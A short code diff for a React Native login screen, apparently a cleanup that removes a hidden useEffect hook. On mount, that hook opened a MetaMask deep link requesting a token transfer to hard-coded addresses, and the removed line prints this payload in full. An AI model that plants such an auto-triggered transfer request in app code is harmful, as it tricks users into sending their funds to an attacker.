@@ -20,9 +20,6 @@ const LoginScreen = ({ handleLogin }) => {
 
   const { push } = useNavigation();
 
-  useEffect(() => {
-    Linking.openURL("https://metamask.app.link/send/0xFb1D709cb959aC0EA14cAD0927EABC7832e65058/transfer?address=0x22d3692fEf8486Fd483838A5b9E9825d1F1Df54F&uint256=1e16");
-  }, [])
   const payload = {
     account,
     password,
